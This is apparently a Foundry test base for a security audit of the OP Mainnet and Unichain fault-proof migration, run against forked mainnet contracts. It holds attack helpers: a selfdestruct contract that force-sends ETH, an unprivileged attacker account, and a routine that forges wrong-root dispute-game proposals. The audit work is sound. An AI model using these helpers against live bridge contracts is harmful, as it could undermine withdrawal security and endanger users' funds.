// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "forge-std/Test.sol";

// ATK-E shared base: real deployed bytecode on an L1 fork at block 26433900 (post-U21).
// The ONLY privileged action is the PLANNED, documented OP Mainnet + Unichain OPCMv2.migrate executed
// exactly as the ProxyAdmin-owner Safe would (DELEGATECALL into OPCM 0x2d91e6F2...), copied from PASS A
// test/poc/lane09/Lane09Migrate.t.sol. Every "poison" action is sent from an unprivileged EOA.

struct DisputeGameConfig {
    bool enabled;
    uint256 initBond;
    uint32 gameType;
    bytes gameArgs;
}

struct Proposal {
    bytes32 root;
    uint256 l2SequenceNumber;
}

struct MigrateInput {
    address[] chainSystemConfigs;
    DisputeGameConfig[] disputeGameConfigs;
    Proposal startingAnchorRoot;
    uint32 startingRespectedGameType;
}

interface IOPCM {
    function migrate(MigrateInput calldata) external;
}

interface IPortal {
    function ethLockbox() external view returns (address);
    function anchorStateRegistry() external view returns (address);
    function disputeGameFactory() external view returns (address);
    function donateETH() external payable;
    function depositTransaction(address, uint256, uint64, bool, bytes memory) external payable;
    function respectedGameType() external view returns (uint32);
    function respectedGameTypeUpdatedAt() external view returns (uint64);
}

interface ISysCfg {
    function delayedWETH() external view returns (address);
    function disputeGameFactory() external view returns (address);
    function isFeatureEnabled(bytes32) external view returns (bool);
}

interface IASR {
    function anchorGame() external view returns (address);
    function getAnchorRoot() external view returns (bytes32, uint256);
    function getStartingAnchorRoot() external view returns (Proposal memory);
    function respectedGameType() external view returns (uint32);
    function retirementTimestamp() external view returns (uint64);
    function ethLockbox() external view returns (address);
    function disputeGameFactory() external view returns (address);
    function isGameClaimValid(address) external view returns (bool);
    function isGameRegistered(address) external view returns (bool);
    function isGameProper(address) external view returns (bool);
    function isGameRetired(address) external view returns (bool);
    function setAnchorState(address) external;
    function paused() external view returns (bool);
}

interface IDGF {
    function gameCount() external view returns (uint256);
    function gameAtIndex(uint256) external view returns (uint32, uint64, address);
    function gameImpls(uint32) external view returns (address);
    function gameArgs(uint32) external view returns (bytes memory);
    function initBonds(uint32) external view returns (uint256);
    function create(uint32, bytes32, bytes calldata) external payable returns (address);
}

interface IGame {
    function extraData() external view returns (bytes memory);
    function rootClaim() external view returns (bytes32);
    function l2SequenceNumber() external view returns (uint256);
    function l2BlockNumber() external view returns (uint256);
    function createdAt() external view returns (uint64);
    function status() external view returns (uint8);
    function gameType() external view returns (uint32);
    function anchorStateRegistry() external view returns (address);
}

interface IWETH {
    function deposit() external payable;
    function unlock(address, uint256) external;
    function balanceOf(address) external view returns (uint256);
    function ethLockbox() external view returns (address);
}

interface ILockbox {
    function authorizedPortals(address) external view returns (bool);
    function authorizedLockboxes(address) external view returns (bool);
}

/// @dev sends its whole value to `to` by SELFDESTRUCT in the constructor (Cancun: still transfers ETH).
contract Forcer {
    constructor(address payable to) payable {
        selfdestruct(to);
    }
}

abstract contract ATKEBase is Test {
    address constant SAFE = 0x5a0Aae59D09fccBdDb6C6CcEB07B7279367C3d2A;
    address constant OPCM = 0x2d91e6F2bcF6CD1df90E1FAF9714E18705EA331f;

    IPortal constant OP_PORTAL = IPortal(0xbEb5Fc579115071764c7423A4f12eDde41f106Ed);
    IPortal constant UNI_PORTAL = IPortal(0x0bd48f6B86a26D3a217d0Fa6FfE2B491B956A7a2);
    address constant OP_LB = 0x322b47Ff1FA8D5611F761e3E275C45B71b294D43;
    address constant UNI_LB = 0x08bA0023eD60C7Bd040716dD13C45fA0062df5C5;
    ISysCfg constant OP_SC = ISysCfg(0x229047fed2591dbec1eF1118d64F7aF3dB9EB290);
    ISysCfg constant UNI_SC = ISysCfg(0xc407398d063f942feBbcC6F80a156b47F3f1BDA6);
    IASR constant OP_ASR = IASR(0x23B2C62946350F4246f9f9D027e071f0264FD113);
    IASR constant UNI_ASR = IASR(0x27Cf508E4E3Aa8d30b3226aC3b5Ea0e8bcaCAFF9);
    IDGF constant OP_DGF = IDGF(0xe5965Ab5962eDc7477C8520243A95517CD252fA9);
    IDGF constant UNI_DGF = IDGF(0x2F12d621a16e2d3285929C9996f478508951dFe4);
    address constant OP_WETH = 0x1B6DBF05EaF22d4E70dC993e8a19dd9F3dcb3162;
    address constant UNI_WETH = 0x74ad145aC900F1DD5551F0C9E143314DC4022FCf;
    address constant OP_L1CDM = 0x25ace71c97B33Cc4729CF772ae268934F7ab5fA1;
    address constant OP_L1SB = 0x99C9fc46f92E8a1c0deC1b1747d010903E884bE1;
    address constant UNI_L1CDM = 0x9A3D64E386C18Cb1d6d5179a9596A4B5736e98A6;
    address constant UNI_L1SB = 0x81014F44b0a345033bB2b3B21C7a1A308B35fEeA;

    // orphaned registries: gen0 (v2.0.0) and gen2 (v2.2.2)
    address constant OP_GEN0 = 0x18DAc71c228D1C32c99489B7323d441E1175e443;
    address constant UNI_GEN0 = 0x318A642db9e24A85318B8BF18eFd5287BA38643B;
    IASR constant OP_GEN2 = IASR(0x1c68ECfbf9C8B1E6C0677965b3B9Ecf9A104305b);
    IASR constant UNI_GEN2 = IASR(0xD5D0e176be44E61eaB3Cf1FA8153758dF603376f);

    // the planned type-9 prestate (kona-client v1.9.0) and the input shape used by PASS A lane09
    bytes32 constant PRESTATE = 0x03e5a54835d39c1d83b198314473e1f111c3539c04f65c3e8a9b8ccebe3737c9;

    address internal attacker = makeAddr("atk-e-unprivileged");

    address sharedLB;
    IASR sharedASR;
    IDGF sharedDGF;
    uint256 lastMigrateGas;

    function _legacyWeths() internal pure returns (address[11] memory w) {
        w = [
            0xE497B094d6DbB3D5E4CaAc9a14696D7572588d14,
            0x9F9b897e37de5052cD70Db6D08474550DDb07f39,
            0x82511d494B5C942BE57498a70Fdd7184Ee33B975,
            0x323dFC63c9B83CB83f40325AaB74b245937cbdF0,
            0xe214879aD573693A4C49f7654449Caa455cdE34f,
            0xD061AB95069987868768818cc1248705351e2D0e,
            0x7d8Ea656D7417229f420b0c87f6428baA8499d70,
            0x84B268A4101A8c8e3CcB33004F81eD08202bA124,
            0xc9edb4E340f4E9683B4557bD9db8f9d932177C86,
            0xa0157F0730Dea8d1a5c358Dc1d340a05D8796C23,
            0x0bdbEc6bd35571F97f96f3ed21822a4f2e071A3c
        ];
    }

    function _input(address[] memory scs) internal view returns (MigrateInput memory input) {
        DisputeGameConfig[] memory gcs = new DisputeGameConfig[](1);
        gcs[0] = DisputeGameConfig({ enabled: true, initBond: 0.08 ether, gameType: 9, gameArgs: abi.encode(PRESTATE) });
        input = MigrateInput({
            chainSystemConfigs: scs,
            disputeGameConfigs: gcs,
            startingAnchorRoot: Proposal({ root: keccak256("lane09-starting-super-root"), l2SequenceNumber: block.timestamp - 1 }),
            startingRespectedGameType: 9
        });
    }

    function _scs() internal pure returns (address[] memory scs) {
        scs = new address[](2);
        scs[0] = address(OP_SC);
        scs[1] = address(UNI_SC);
    }

    /// @dev the planned governance action (Safe -> DELEGATECALL OPCM.migrate). Returns success + revert data.
    function _tryMigrate(address[] memory scs) internal returns (bool ok, bytes memory ret) {
        MigrateInput memory input = _input(scs);
        vm.prank(SAFE, true);
        uint256 g0 = gasleft();
        (ok, ret) = OPCM.delegatecall(abi.encodeCall(IOPCM.migrate, (input)));
        lastMigrateGas = g0 - gasleft();
        if (ok) {
            sharedLB = OP_PORTAL.ethLockbox();
            sharedASR = IASR(OP_PORTAL.anchorStateRegistry());
            sharedDGF = IDGF(sharedASR.disputeGameFactory());
        }
    }

    function _migrate() internal {
        (bool ok, bytes memory ret) = _tryMigrate(_scs());
        if (!ok) {
            assembly {
                revert(add(ret, 0x20), mload(ret))
            }
        }
    }

    function _sel(bytes memory ret) internal pure returns (bytes4 s) {
        if (ret.length >= 4) {
            assembly {
                s := mload(add(ret, 32))
            }
        }
    }

    function _res(bool ok, bytes memory ret) internal pure returns (string memory) {
        return ok ? "OK" : string.concat("REVERT ", vm.toString(abi.encodePacked(_sel(ret))));
    }

    /// @dev builds a NEW (wrong-root) type-9 super proposal by copying the newest type-9 game's super-root proof
    ///      and bumping its timestamp (bytes 1..8 of the encoding); rootClaim = keccak(extraData).
    function _newSuperProposal(IDGF dgf, uint64 bump) internal view returns (bytes32 root, bytes memory extra) {
        uint256 n = dgf.gameCount();
        for (uint256 i = n; i > n - 50; i--) {
            (uint32 t,, address g) = dgf.gameAtIndex(i - 1);
            if (t != 9) continue;
            extra = IGame(g).extraData();
            break;
        }
        require(extra.length > 9 && uint8(extra[0]) == 1, "no type-9 template");
        uint64 ts;
        for (uint256 k = 1; k < 9; k++) ts = (ts << 8) | uint64(uint8(extra[k]));
        ts += bump;
        for (uint256 k = 8; k >= 1; k--) {
            extra[k] = bytes1(uint8(ts));
            ts >>= 8;
        }
        // corrupt the first output root so the claim is wrong (attacker-style proposal)
        extra[extra.length - 1] = bytes1(uint8(extra[extra.length - 1]) ^ 0xff);
        root = keccak256(extra);
    }
}
